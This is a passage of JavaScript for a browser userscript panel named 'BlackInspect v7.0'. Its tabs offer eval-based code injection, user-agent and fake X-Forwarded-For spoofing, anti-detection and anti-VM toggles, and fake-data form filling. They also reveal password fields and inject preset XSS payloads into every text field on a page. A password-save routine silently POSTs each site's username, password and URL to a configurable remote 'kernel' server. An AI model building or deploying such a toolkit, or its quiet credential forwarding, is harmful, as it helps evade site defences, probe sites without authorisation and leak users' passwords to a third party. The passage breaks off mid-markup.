                    dlBlob(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}), 'variables.json');
                };
                scanVars();
            }

            // ---- Inject ----
            else if (tab === 'Inject') {
                content.innerHTML = `<h4>▶ ${_('Run Code')}</h4>
                <textarea id="codeInj" style="height:140px;resize:vertical;font-family:Consolas,monospace;"></textarea>
                <button id="runCode" style="background:#c5862c;color:#fff;width:100%;margin-top:6px;">▶ ${_('Run Code')}</button>
                <div id="injOut" style="margin-top:8px;color:#6a9955;font-size:11px;white-space:pre-wrap;max-height:150px;overflow-y:auto;background:#252526;padding:6px;border-radius:3px;"></div>`;
                D.getElementById('runCode').onclick = () => {
                    const code = D.getElementById('codeInj').value;
                    const out = D.getElementById('injOut');
                    try { out.textContent = '✅ ' + _('Executed. Return value:') + '\n' + String(eval(code)); }
                    catch (e) { out.textContent = '❌ ' + e.message; }
                };
            }

            // ---- Spoof ----
            else if (tab === 'Spoof') {
                const tpls = {
                    chrome_win: { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', plat: 'Win32', lang: 'en-US' },
                    firefox_linux: { ua: 'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', plat: 'Linux x86_64', lang: 'en-US' },
                    safari_mac: { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15', plat: 'MacIntel', lang: 'en-US' },
                    edge_win: { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0', plat: 'Win32', lang: 'en-US' },
                    iphone: { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1', plat: 'iPhone', lang: 'en-US' },
                    android: { ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/126.0.6478.122 Mobile Safari/537.36', plat: 'Linux armv8l', lang: 'en-US' },
                };
                content.innerHTML = `
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                <div class="bi-sec">
                    <h4>📡 Spoof</h4>
                    <label>${_('Template:')}</label>
                    <select id="tpl" style="margin-bottom:6px;">
                        <option value="">${_('-- Custom --')}</option>
                        <option value="chrome_win">Chrome Windows</option>
                        <option value="firefox_linux">Firefox Linux</option>
                        <option value="safari_mac">Safari macOS</option>
                        <option value="edge_win">Edge Windows</option>
                        <option value="iphone">iPhone Safari</option>
                        <option value="android">Android Chrome</option>
                    </select>
                    <label>${_('Fake IP (X-Forwarded-For):')}</label>
                    <div class="bi-row"><input id="fakeIP" value="${S.ip}"><span id="randIP" style="cursor:pointer;background:#4d4d4d;color:#fff;border-radius:3px;padding:2px 6px;flex-shrink:0;">🎲</span></div>
                    <label>${_('User-Agent:')}</label><input id="ua" value="${S.ua}" style="margin-bottom:6px;">
                    <label>${_('Platform:')}</label><input id="plat" value="${S.platform}" style="margin-bottom:6px;">
                    <label>${_('Language:')}</label><input id="lang" value="${S.language}" style="margin-bottom:6px;">
                    <label><input type="checkbox" id="cfgBreak" ${S.breakOnStart?'checked':''}> ${_('Break on load')}</label><br>
                    <div class="bi-row" style="margin-top:6px;">
                        <button id="startSpoof" style="flex:1;background:#0e639c;color:#fff;">▶ ${_('Start Spoofing')}</button>
                        <button id="stopSpoof" style="flex:1;background:#c53030;color:#fff;" ${S.spoofActive?'':'disabled'}>⏹ ${_('Stop Spoofing')}</button>
                    </div>
                    <div id="spoofStatus" style="margin-top:6px;font-size:11px;color:#6a9955;">${S.spoofActive?'✅ '+_('Spoofing active (applied on load)'):''}</div>
                </div>
                <div>
                    <div class="bi-sec">
                        <h4>💾 ${_('Profile')}</h4>
                        <button id="exportCfg" style="width:100%;background:#0e639c;color:#fff;margin-bottom:4px;">📥 ${_('Export Profile')}</button>
                        <button id="importCfg" style="width:100%;background:#4d4d4d;color:#fff;margin-bottom:4px;">📤 ${_('Import Profile')}</button>
                        <input type="file" id="importFile" style="display:none" accept=".json">
                        <button id="saveCfg" style="width:100%;background:#c5862c;color:#fff;">💾 ${_('Save Settings')}</button>
                        <div id="cfgStatus" style="margin-top:6px;font-size:11px;color:#6a9955;"></div>
                        <div style="margin-top:8px;"><label><input type="checkbox" id="canvasToggle" ${S.canvasSpoof?'checked':''}> ${_('Canvas Spoof')}</label></div>
                    </div>
                    <div class="bi-sec">
                        <h4>🛡 Anti-Detection</h4>
                        <label><input type="checkbox" id="tabVisToggle" ${S.tabVisSpoof?'checked':''}> ${_('Tab Visibility Spoof')}</label><br>
                        <label><input type="checkbox" id="hideExtToggle" ${S.hideExtensions?'checked':''}> ${_('Hide Browser Extensions')}</label><br>
                        <label><input type="checkbox" id="buildIdToggle" ${S.spoofBuildID?'checked':''}> ${_('Spoof Firefox BuildID')}</label><br>
                        <label><input type="checkbox" id="antiVMToggle" ${S.antiVM?'checked':''}> ${_('Anti-VM Detection')}</label><br>
                        <div style="font-size:10px;color:#888;margin-top:4px;">Changes apply on next page load</div>
                    </div>
                </div>
                </div>`;
                D.getElementById('tpl').onchange = function() { const t=this.value; if(t&&tpls[t]){D.getElementById('ua').value=tpls[t].ua;D.getElementById('plat').value=tpls[t].plat;D.getElementById('lang').value=tpls[t].lang;} };
                D.getElementById('randIP').onclick = () => { D.getElementById('fakeIP').value = Array.from({length:4},()=>Math.floor(Math.random()*256)).join('.'); };
                D.getElementById('startSpoof').onclick = () => {
                    const ip=D.getElementById('fakeIP').value.trim(), ua=D.getElementById('ua').value.trim(), plat=D.getElementById('plat').value.trim(), lang=D.getElementById('lang').value.trim();
                    if(!ip&&!ua&&!plat&&!lang){D.getElementById('spoofStatus').textContent='⚠ '+_('At least one field must be filled.');return;}
                    S.spoofActive=true; S.ip=ip; S.ua=ua; S.platform=plat; S.language=lang;
                    applySpoofing(ip,ua,plat,lang);
                    D.getElementById('spoofStatus').textContent='✅ '+_('Spoofing started.');
                    D.getElementById('startSpoof').disabled=true; D.getElementById('stopSpoof').disabled=false;
                };
                D.getElementById('stopSpoof').onclick = () => { S.spoofActive=false; D.getElementById('spoofStatus').textContent='⏹ '+_('Spoofing stopped (page reload needed to restore default fetch/XHR)'); D.getElementById('startSpoof').disabled=false; D.getElementById('stopSpoof').disabled=true; };
                D.getElementById('exportCfg').onclick = () => { const data={ip:D.getElementById('fakeIP').value,ua:D.getElementById('ua').value,platform:D.getElementById('plat').value,language:D.getElementById('lang').value,breakOnStart:D.getElementById('cfgBreak').checked}; dlBlob(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}),S.profileFile); D.getElementById('cfgStatus').textContent='✅ '+_('Profile downloaded.'); };
                D.getElementById('importCfg').onclick = () => D.getElementById('importFile').click();
                D.getElementById('importFile').onchange = e => { const f=e.target.files[0]; if(!f)return; const r=new FileReader(); r.onload=ev=>{try{const d=JSON.parse(ev.target.result);D.getElementById('fakeIP').value=d.ip||'';D.getElementById('ua').value=d.ua||'';D.getElementById('plat').value=d.platform||'';D.getElementById('lang').value=d.language||'';D.getElementById('cfgBreak').checked=!!d.breakOnStart;D.getElementById('cfgStatus').textContent='✅ '+_('Profile loaded.');}catch(ex){D.getElementById('cfgStatus').textContent='❌ '+ex.message;}}; r.readAsText(f); };
                D.getElementById('saveCfg').onclick = () => { S.ip=D.getElementById('fakeIP').value; S.ua=D.getElementById('ua').value; S.platform=D.getElementById('plat').value; S.language=D.getElementById('lang').value; S.breakOnStart=D.getElementById('cfgBreak').checked; D.getElementById('cfgStatus').textContent='✅ '+_('Settings saved.'); };
                D.getElementById('canvasToggle').onchange = function() { S.canvasSpoof=this.checked; if(this.checked)applyCanvasSpoof(); };
                D.getElementById('tabVisToggle').onchange = function() { S.tabVisSpoof=this.checked; if(this.checked)applyTabVisibilitySpoof(); };
                D.getElementById('hideExtToggle').onchange = function() { S.hideExtensions=this.checked; if(this.checked)applyHideExtensions(); };
                D.getElementById('buildIdToggle').onchange = function() { S.spoofBuildID=this.checked; if(this.checked)applyBuildIDSpoof(); };
                D.getElementById('antiVMToggle').onchange = function() { S.antiVM=this.checked; if(this.checked)applyAntiVM(); };
            }

            // ---- Pass ----
            else if (tab === 'Pass') {
                content.innerHTML = `
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                <div class="bi-sec">
                    <h4>🔐 ${_('Password Generator')}</h4>
                    <label>${_('Length:')} <span id="lenVal">12</span></label>
                    <input type="range" id="passLen" min="8" max="32" value="12" style="width:100%;accent-color:#007acc;" oninput="document.getElementById('lenVal').textContent=this.value">
                    <label><input type="checkbox" id="incNum" checked> ${_('Numbers')}</label><br>
                    <label><input type="checkbox" id="incUpper" checked> ${_('Uppercase')}</label><br>
                    <label><input type="checkbox" id="incLower" checked> ${_('Lowercase')}</label><br>
                    <label><input type="checkbox" id="incSpec"> ${_('Special')}</label><br>
                    <button id="genPass" style="width:100%;background:#4d4d4d;color:#fff;margin-top:6px;">${_('Generate')}</button>
                    <div style="margin-top:6px;font-size:11px;">${_('Generated:')} <b id="genOut" style="color:#007acc;word-break:break-all;"></b></div>
                    <label><input type="checkbox" id="autoUser"> ${_('Auto-fill username/email')}</label>
                    <button id="usePassBtn" style="width:100%;background:#4d4d4d;color:#fff;margin-top:6px;">🖊 ${_('Use Password')}</button>
                    <div id="passMsg" style="margin-top:6px;font-size:11px;color:#6a9955;"></div>
                    <hr style="border-color:#3e3e42;margin:8px 0;">
                    <h4>👤 ${_('Fake Data')}</h4>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
                        <button id="fillName" style="background:#4d4d4d;color:#fff;">👤 ${_('Fill Name')}</button>
                        <button id="fillEmail" style="background:#4d4d4d;color:#fff;">📧 ${_('Fill Email')}</button>
                        <button id="fillPhone" style="background:#4d4d4d;color:#fff;">📞 ${_('Fill Phone')}</button>
                        <button id="fillAll" style="background:#0e639c;color:#fff;">⚡ ${_('Fill All')}</button>
                    </div>
                    <div id="fakeOut" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>
                </div>
                <div class="bi-sec">
                    <h4>💾 ${_('Saved Passwords')}</h4>
                    <input id="saveUser" placeholder="${_('Username')}" style="margin-bottom:4px;">
                    <button id="saveEntry" style="width:100%;background:#4d4d4d;color:#fff;margin-bottom:8px;">${_('Save Current Password')}</button>
                    <div id="savedList" style="max-height:160px;overflow-y:auto;font-size:11px;"></div>
                    <div class="bi-row" style="margin-top:8px;">
                        <button id="exportPass" style="flex:1;background:#4d4d4d;color:#fff;">📤 ${_('Export')}</button>
                        <button id="importPass" style="flex:1;background:#4d4d4d;color:#fff;">📥 ${_('Import')}</button>
                    </div>
                    <input type="file" id="importPassFile" style="display:none" accept=".json">
                    <div style="margin-top:8px;font-size:11px;color:#888;">${_('Default save path:')} ${S.passFile}</div>
                </div>
                </div>`;
                const cs = {num:'0123456789',upper:'ABCDEFGHIJKLMNOPQRSTUVWXYZ',lower:'abcdefghijklmnopqrstuvwxyz',spec:'!@#$%^&*()_+-=[]{}|;:,.<>?'};
                const genPass = () => { const len=parseInt(D.getElementById('passLen').value); let chars=''; if(D.getElementById('incNum').checked)chars+=cs.num; if(D.getElementById('incUpper').checked)chars+=cs.upper; if(D.getElementById('incLower').checked)chars+=cs.lower; if(D.getElementById('incSpec').checked)chars+=cs.spec; if(!chars)return''; let p=''; for(let i=0;i<len;i++)p+=chars[Math.floor(Math.random()*chars.length)]; return p; };
                D.getElementById('genPass').onclick = () => D.getElementById('genOut').textContent = genPass();
                const fnames=['Ali','Reza','Sara','Maryam','Mohammad','Fatemeh','Hossein','Zahra','Mehdi','Narges','Amir','Parisa'];
                const emails=['test@example.com','user@mail.com','info@site.org'];
                const phones=['09123456789','09351234567','09187654321'];
                const rand = arr => arr[Math.floor(Math.random()*arr.length)];
                const fillByAttr = (attr, val) => { let c=0; D.querySelectorAll('input:not([type=hidden])').forEach(inp=>{ const n=(inp.name||'').toLowerCase()+' '+(inp.id||'').toLowerCase()+' '+(inp.placeholder||'').toLowerCase(); if(n.includes(attr)){inp.value=val;inp.dispatchEvent(new Event('input',{bubbles:true}));c++;} }); return c; };
                D.getElementById('fillName').onclick = () => { const c=fillByAttr('name',rand(fnames))+fillByAttr('first',rand(fnames))+fillByAttr('last',rand(fnames)); D.getElementById('fakeOut').textContent=`✅ ${c} ${_('fields filled.')}`; };
                D.getElementById('fillEmail').onclick = () => { const c=fillByAttr('email',rand(emails))+fillByAttr('mail',rand(emails)); D.getElementById('fakeOut').textContent=`✅ ${c} ${_('fields filled.')}`; };
                D.getElementById('fillPhone').onclick = () => { const c=fillByAttr('phone',rand(phones))+fillByAttr('mobile',rand(phones))+fillByAttr('tel',rand(phones)); D.getElementById('fakeOut').textContent=`✅ ${c} ${_('fields filled.')}`; };
                D.getElementById('fillAll').onclick = () => { const c=fillByAttr('name',rand(fnames))+fillByAttr('email',rand(emails))+fillByAttr('phone',rand(phones)); D.getElementById('fakeOut').textContent=`✅ ${c} ${_('fields filled.')}`; };
                D.getElementById('usePassBtn').onclick = () => { const pass=D.getElementById('genOut').textContent; if(!pass){D.getElementById('passMsg').textContent=_('No password generated.');return;} D.querySelectorAll('input[type=password]').forEach(inp=>{inp.value=pass;inp.dispatchEvent(new Event('input',{bubbles:true}));}); D.getElementById('passMsg').textContent='✅ '+_('Password filled.'); };
                const updateList = () => { const lst=D.getElementById('savedList'); lst.innerHTML=S.passwords.map((e,i)=>`<div style="border-bottom:1px solid #3e3e42;padding:3px 0;display:flex;justify-content:space-between;"><span><b>${e.domain}</b> ${e.username}</span><span style="cursor:pointer;color:#007acc;" onclick="navigator.clipboard&&navigator.clipboard.writeText('${e.password}')">📋</span></div>`).join('')||'<span style="color:#888;">—</span>'; };
                D.getElementById('saveEntry').onclick = async () => {
                    const user=D.getElementById('saveUser').value.trim(), pass=D.getElementById('genOut').textContent;
                    if(!user||!pass)return;
                    const arr=S.passwords; arr.push({domain:location.hostname,username:user,password:pass}); S.passwords=arr; updateList();
                    dlBlob(new Blob([JSON.stringify(S.passwords,null,2)],{type:'application/json'}),S.passFile);
                    D.getElementById('passMsg').textContent='✅ '+_('Password saved and exported.');
                    // also sync to kernel if online
                    if(_kernelOnline&&S.kernelUrl){
                        try{await fetch(S.kernelUrl+'/passwords/autosave',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain:location.hostname,username:user,password:pass,url:location.href})});}catch(e){}
                    }
                };
                D.getElementById('exportPass').onclick = () => dlBlob(new Blob([JSON.stringify(S.passwords,null,2)],{type:'application/json'}),S.passFile);
                D.getElementById('importPass').onclick = () => D.getElementById('importPassFile').click();
                D.getElementById('importPassFile').onchange = e => { const f=e.target.files[0]; if(!f)return; const r=new FileReader(); r.onload=ev=>{try{S.passwords=JSON.parse(ev.target.result);updateList();}catch(ex){}}; r.readAsText(f); };
                updateList();
                D.getElementById('genOut').textContent = genPass();
            }

            // ---- Storage ----
            else if (tab === 'Storage') {
                content.innerHTML = `<h4>💾 ${_('Cookie & LocalStorage')}</h4>
                <div class="bi-row">
                    <button id="viewCookies" style="flex:1;background:#4d4d4d;color:#fff;">🍪 ${_('View Cookies')}</button>
                    <button id="viewLS" style="flex:1;background:#4d4d4d;color:#fff;">📦 ${_('View LocalStorage')}</button>
                </div>
                <div id="storView" style="font-size:11px;color:#6a9955;max-height:120px;overflow-y:auto;background:#252526;padding:6px;border-radius:4px;margin:6px 0;"></div>
                <label>${_('Name:')}</label><input id="storName" placeholder="key" style="margin-bottom:4px;">
                <label>${_('Value:')}</label><input id="storVal" placeholder="value" style="margin-bottom:6px;">
                <div class="bi-row">
                    <button id="setCookie" style="flex:1;background:#4d4d4d;color:#fff;">🍪 ${_('Set Cookie')}</button>
                    <button id="setLS" style="flex:1;background:#4d4d4d;color:#fff;">📦 ${_('Set LocalStorage')}</button>
                </div>
                <div id="storOut" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>`;
                D.getElementById('viewCookies').onclick = () => { D.getElementById('storView').innerHTML = D.cookie.split(';').map(c=>c.trim()).join('<br>') || _('No cookies'); };
                D.getElementById('viewLS').onclick = () => { let h=''; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);h+=`<b>${k}</b> = ${localStorage.getItem(k)}<br>`;} D.getElementById('storView').innerHTML=h||_('No localStorage'); };
                D.getElementById('setCookie').onclick = () => { const n=D.getElementById('storName').value.trim(),v=D.getElementById('storVal').value; if(!n)return; D.cookie=`${n}=${encodeURIComponent(v)};path=/;SameSite=Lax`; D.getElementById('storOut').textContent=`✅ ${_('Cookie set:')} ${n}=${v}`; };
                D.getElementById('setLS').onclick = () => { const n=D.getElementById('storName').value.trim(),v=D.getElementById('storVal').value; if(!n)return; try{localStorage.setItem(n,v);D.getElementById('storOut').textContent=`✅ ${_('LocalStorage set:')} ${n}=${v}`;}catch(e){D.getElementById('storOut').textContent='❌ '+e.message;} };
            }

            // ---- Tools ----
            else if (tab === 'Tools') {
                content.innerHTML = `
                <button id="breakBtn" style="width:100%;color:#fff;margin-bottom:6px;">🔓 ${_('Break Restrictions')}</button>
                <div id="breakOptions" style="background:#252526;padding:10px;border-radius:4px;margin-bottom:6px;display:none;">
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
                        <label><input type="checkbox" id="brkContext" checked> Contextmenu</label>
                        <label><input type="checkbox" id="brkCopy" checked> Copy</label>
                        <label><input type="checkbox" id="brkPaste" checked> Paste</label>
                        <label><input type="checkbox" id="brkSelect" checked> Selectstart</label>
                        <label><input type="checkbox" id="brkDrag" checked> Dragstart</label>
                        <label><input type="checkbox" id="brkMouse" checked> Mousedown</label>
                    </div>
                    <button id="doBreak" style="background:#c53030;color:#fff;width:100%;margin-top:8px;">${_('Break Selected')}</button>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
                    <button id="bdown" style="background:#0e639c;color:#fff;">📦 ${_('Download Full Page')}</button>
                    <button id="copyAllText" style="background:#c5862c;color:#fff;">📋 ${_('Copy All Text')}</button>
                    <button id="stopLoadBtn" style="background:#c53030;color:#fff;">⏹ ${_('Stop Loading')}</button>
                    <button id="screenshotBtn" style="background:#4d4d4d;color:#fff;">📸 ${_('Full Page Screenshot')}</button>
                    <button id="refreshBtn" style="background:#4d4d4d;color:#fff;">🔄 ${_('Refresh Page')}</button>
                    <button id="resetPosBtn" style="background:#4d4d4d;color:#fff;">🔃 Reset Position</button>
                    <button id="openPopupBtn" style="background:#4d4d4d;color:#fff;">🪟 ${_('Open Panel in Popup')}</button>
                    <button id="showPasswordsBtn" style="background:#4d4d4d;color:#fff;">🔎 ${_('Show All Passwords')}</button>
                </div>
                <div class="bi-sec">
                    <label>${_('XSS Payload:')}</label>
                    <select id="xssPayload" style="margin-bottom:4px;">
                        <option value="&lt;script&gt;alert(1)&lt;/script&gt;">&lt;script&gt;alert(1)&lt;/script&gt;</option>
                        <option value="&lt;img src=x onerror=alert(1)&gt;">&lt;img src=x onerror=alert(1)&gt;</option>
                        <option value="&lt;svg/onload=alert(1)&gt;">&lt;svg/onload=alert(1)&gt;</option>
                        <option value="'-alert(1)-'">'-alert(1)-'</option>
                        <option value="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">&gt;&lt;script&gt;alert(1)&lt;/script&gt;</option>
                    </select>
                    <button id="injectXSS" style="width:100%;background:#4d4d4d;color:#fff;">💉 ${_('Inject XSS')}</button>
                </div>
                <div class="bi-sec">
                    <label>${_('Split View with AI')}</label>
                    <select id="aiService" style="margin-bottom:4px;">
                        <option value="">-- AI --</option>
                        <option value="chatgpt">${_('ChatGPT')}</option>
                        <option value="deepseek">${_('DeepSeek')}</option>
                        <option value="gemini">${_('Gemini')}</option>
                        <option value="claude">${_('Claude')}</option>
                        <option value="kimi">${_('Kimi')}</option>
                    </select>
                    <button id="openSplitBtn" style="width:100%;background:#0e639c;color:#fff;">🖥 ${_('Open Split')}</button>
                </div>
                <div id="toolsOut" style="font-size:11px;color:#6a9955;margin-top:6px;"></div>`;

                const breakBtn = D.getElementById('breakBtn');
                const breakOpts = D.getElementById('breakOptions');
                updateBreakButton();
                breakBtn.onclick = () => {
                    if (restrictionsBroken) { location.reload(); }
                    else { breakOpts.style.display = breakOpts.style.display === 'none' ? 'block' : 'none'; }
                };
                D.getElementById('doBreak').onclick = () => {
                    const opts={contextmenu:D.getElementById('brkContext').checked,copy:D.getElementById('brkCopy').checked,paste:D.getElementById('brkPaste').checked,selectstart:D.getElementById('brkSelect').checked,dragstart:D.getElementById('brkDrag').checked,mousedown:D.getElementById('brkMouse').checked};
                    S.breakOptions=opts; breakRestrictions(opts); restrictionsBroken=true; updateBreakButton();
                    D.getElementById('toolsOut').textContent='✅ '+_('Restrictions broken.'); breakOpts.style.display='none';
                };
                D.getElementById('bdown').onclick = async () => {
                    const st=D.getElementById('toolsOut'); st.textContent='⏳ '+_('Collecting page...');
                    try {
                        const cl=D.documentElement.cloneNode(true);
                        const final='<!DOCTYPE html>\n'+cl.outerHTML;
                        dlBlob(new Blob([final],{type:'text/html'}),D.title.replace(/[^a-z0-9]/gi,'_')+'_fullpage.html');
                        st.textContent='✅ '+_('Downloaded!');
                    } catch(e){st.textContent='❌ '+e.message;}
                };
                D.getElementById('copyAllText').onclick = () => {
                    breakRestrictions();
                    const walker=D.createTreeWalker(D.body,NodeFilter.SHOW_TEXT,{acceptNode:n=>n.parentNode.closest('#'+BS)?NodeFilter.FILTER_REJECT:NodeFilter.FILTER_ACCEPT});
                    let text=''; while(walker.nextNode())text+=walker.currentNode.nodeValue;
                    const st=D.getElementById('toolsOut');
                    if(N.clipboard&&N.clipboard.writeText){N.clipboard.writeText(text).then(()=>{st.textContent=`✅ ${_('Copied (')}${text.length}${_(' characters)')}`;}).catch(()=>{});}
                };
                const stopBtn=D.getElementById('stopLoadBtn');
                stopBtn.textContent = stopped ? '▶ '+_('Resume Loading') : '⏹ '+_('Stop Loading');
                stopBtn.style.background = stopped ? '#0f0' : '#c53030';
                stopBtn.style.color = stopped ? '#000' : '#fff';
                stopBtn.onclick = () => { if(!stopped){W.stop();stopped=true;stopBtn.textContent='▶ '+_('Resume Loading');stopBtn.style.background='#0f0';stopBtn.style.color='#000';}else{location.reload();} };
                D.getElementById('injectXSS').onclick = () => { const payload=D.getElementById('xssPayload').value; const inputs=D.querySelectorAll('input[type=text],input:not([type]),textarea'); inputs.forEach(inp=>{inp.value=payload;inp.dispatchEvent(new Event('input',{bubbles:true}));}); D.getElementById('toolsOut').textContent=`✅ ${_('XSS payload injected into ')}${inputs.length}${_(' fields.')}`; };
                D.getElementById('showPasswordsBtn').onclick = () => { const inputs=D.querySelectorAll('input[type=password]'); inputs.forEach(inp=>inp.type='text'); D.getElementById('toolsOut').textContent=`✅ ${inputs.length} ${_('password fields revealed.')}`; };
                D.getElementById('screenshotBtn').onclick = async () => {
                    const st=D.getElementById('toolsOut'); st.textContent='📸 '+_('Capturing screenshot...');
                    try { await loadHtml2canvas(); if(!html2canvas)throw new Error(); const canvas=await html2canvas(D.body,{scrollY:-window.scrollY,height:D.body.scrollHeight,windowHeight:D.body.scrollHeight}); const blob=await new Promise(r=>canvas.toBlob(r,'image/png')); dlBlob(blob,'screenshot.png'); st.textContent='✅ '+_('Screenshot saved.'); } catch(e){st.textContent='❌ '+e.message;}
                };
                D.getElementById('refreshBtn').onclick = () => location.reload();
                D.getElementById('resetPosBtn').onclick = resetPanelPosition;
                D.getElementById('openPopupBtn').onclick = () => {
                    const w=window.open('','BlackInspectPopup','width=900,height=600,resizable=yes,scrollbars=yes');
                    if(!w){D.getElementById('toolsOut').textContent='❌ Popup blocked.';return;}
                    w.document.write(`<!DOCTYPE html><html><head><title>BlackInspect v7.0</title><style>body{margin:0;background:#1e1e1e;color:#d4d4d4;font-family:Consolas,monospace;padding:10px;}</style></head><body><h2 style="color:#007acc;">⚙ BlackInspect v7.0 Popup</h2><p>Full panel cannot be moved to popup window. Use this window for quick notes or references.</p><textarea style="width:100%;height:400px;background:#252526;color:#d4d4d4;border:1px solid #3e3e42;padding:8px;font-family:Consolas;font-size:12px;" placeholder="Notes..."></textarea></body></html>`);
                    D.getElementById('toolsOut').textContent='✅ Popup opened.';
                };
                const aiUrls={chatgpt:'https://chat.openai.com',deepseek:'https://chat.deepseek.com',gemini:'https://gemini.google.com',claude:'https://claude.ai',kimi:'https://kimi.moonshot.cn'};
                D.getElementById('openSplitBtn').onclick = () => { const svc=D.getElementById('aiService').value; if(!svc)return; const popup=window.open(aiUrls[svc],'_blank',`width=${innerWidth/2},height=${innerHeight},left=${screenX+innerWidth-innerWidth/2},top=${screenY}`); D.getElementById('toolsOut').textContent=popup?'✅ Split opened.':'❌ Popup blocked.'; };
            }

            // ---- DOM ----
            else if (tab === 'DOM') {
                content.innerHTML = `<h4>🔍 ${_('DOM Monitor')}</h4>
                <div class="bi-row">
                    <button id="startDOM" style="flex:1;background:#0e639c;color:#fff;">▶ ${_('Start')}</button>
                    <button id="stopDOM" style="flex:1;background:#4d4d4d;color:#fff;">⏹ ${_('Stop')}</button>
                    <button id="clearDOM" style="flex:1;background:#4d4d4d;color:#fff;">🗑</button>
                </div>
                <div id="domLog" style="max-height:250px;overflow-y:auto;font-size:11px;background:#252526;padding:6px;border-radius:4px;color:#6a9955;"></div>`;
                let observer=null;
                const domLog=D.getElementById('domLog');
                D.getElementById('startDOM').onclick = () => { if(observer)return; observer=new MutationObserver(muts=>{ muts.forEach(m=>{const d=D.createElement('div');d.textContent=`[${new Date().toLocaleTimeString()}] ${m.type==='childList'?`+${m.addedNodes.length}/-${m.removedNodes.length} nodes`:`attr:${m.attributeName} on <${m.target.tagName}>`}`;domLog.appendChild(d);}); domLog.scrollTop=domLog.scrollHeight; }); observer.observe(D.body,{childList:true,subtree:true,attributes:true,attributeFilter:['style','class','src']}); };
                D.getElementById('stopDOM').onclick = () => { if(observer){observer.disconnect();observer=null;} };
                D.getElementById('clearDOM').onclick = () => { domLog.innerHTML=''; };
            }

            // ---- Canvas ----
            else if (tab === 'Canvas') {
                content.innerHTML = `<h4>🎨 ${_('Canvas Fingerprint Spoof')}</h4>
                <div class="bi-sec">
                    <button id="toggleCanvas" style="width:100%;background:#4d4d4d;color:#fff;margin-bottom:4px;">${_('Toggle Spoofing')}</button>
                    <div id="canvasStatus" style="font-size:11px;"></div>
                    <div style="margin-top:8px;font-size:11px;color:#888;">Adds subtle cryptographic noise to all canvas read operations (getImageData, toDataURL), preventing fingerprinting while keeping visuals identical to the eye.</div>
                </div>`;
                const updateStatus = () => { D.getElementById('canvasStatus').style.color=S.canvasSpoof?'#6a9955':'#888'; D.getElementById('canvasStatus').textContent=S.canvasSpoof?'✅ '+_('Active'):'⏹ '+_('Inactive'); };
                updateStatus();
                D.getElementById('toggleCanvas').onclick = () => { S.canvasSpoof=!S.canvasSpoof; if(S.canvasSpoof)applyCanvasSpoof(); updateStatus(); };
            }

            // ---- ModReq ----
            else if (tab === 'ModReq') {
                content.innerHTML = `<h4>✏️ ${_('HTTP Request Modifier')}</h4>
                <label>${_('URL pattern (regex):')}</label><input id="modUrl" placeholder=".*" style="margin-bottom:6px;">
                <label>${_('Header Name:')}</label><input id="modHName" placeholder="X-Custom-Header" style="margin-bottom:6px;">
                <label>${_('Header Value:')}</label><input id="modHVal" placeholder="value" style="margin-bottom:6px;">
                <div class="bi-row">
                    <button id="applyMod" style="flex:1;background:#0e639c;color:#fff;">🔧 ${_('Apply Modifier')}</button>
                    <button id="resetMod" style="flex:1;background:#c53030;color:#fff;">🔄 ${_('Reset')}</button>
                </div>
                <div id="modStatus" style="font-size:11px;color:#6a9955;margin-top:4px;"></div>`;
                let modActive=false, origFetchMod=W.fetch;
                D.getElementById('applyMod').onclick = () => { if(modActive)return; const p=D.getElementById('modUrl').value.trim(), hn=D.getElementById('modHName').value.trim(), hv=D.getElementById('modHVal').value.trim(); if(!hn){D.getElementById('modStatus').textContent='⚠ '+_('Header name required.');return;} let regex; try{regex=new RegExp(p);}catch(e){D.getElementById('modStatus').textContent='❌ '+_('Invalid regex.');return;} modActive=true; W.fetch=function(...a){const url=typeof a[0]==='string'?a[0]:a[0].url; if(regex.test(url)){const h=new Headers((a[1]||{}).headers||{});h.set(hn,hv);return origFetchMod(a[0],{...a[1],headers:h});} return origFetchMod.apply(this,a);}; D.getElementById('modStatus').textContent='✅ '+_('Header modifier applied to fetch.'); };
                D.getElementById('resetMod').onclick = () => { if(modActive){W.fetch=origFetchMod;modActive=false;D.getElementById('modStatus').textContent='🔄 '+_('Reset to default.');} };
            }

            // ---- Network (NEW) ----
            else if (tab === 'Network') {
                content.innerHTML = `
                <div class="bi-sec">
                    <h4>📊 ${_('FPS Monitor')}</h4>
                    <div class="bi-row">
                        <button id="startFPS" style="flex:1;background:#0e639c;color:#fff;">▶ ${_('Start FPS')}</button>
                        <button id="stopFPS" style="flex:1;background:#c53030;color:#fff;">⏹ ${_('Stop FPS')}</button>
                        <span id="fpsDisplay" style="font-size:18px;color:#007acc;font-weight:bold;min-width:80px;text-align:center;">-- FPS</span>
                    </div>
                </div>
                <div class="bi-sec">
                    <h4>🔑 ${_('Auth Header Injection')}</h4>
                    <label>${_('Header Name')}</label><input id="authHName" value="${S.authHeaderName}" style="margin-bottom:4px;">
                    <label>${_('Token / Value')}</label><input id="authHVal" value="${S.authHeaderValue}" placeholder="Bearer eyJ..." style="margin-bottom:6px;">
                    <div class="bi-row">
                        <button id="startAuth" style="flex:1;background:#0e639c;color:#fff;">▶ ${_('Inject Header')}</button>
